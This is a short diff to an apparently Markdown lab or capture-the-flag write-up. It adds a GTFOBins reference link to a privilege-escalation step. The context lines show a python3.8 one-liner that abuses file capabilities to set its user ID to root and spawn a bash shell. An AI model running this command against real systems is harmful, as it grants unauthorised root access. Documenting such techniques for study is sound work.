@@ -156,6 +156,8 @@ The following binary was found with elevated capabilities:
 ```
 Using GTFOBins, I executed the following command to escalate privileges:
 
+**GTFOBins Reference:** https://gtfobins.github.io/gtfobins/python/#capabilities
+
 ```bash
 
 python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
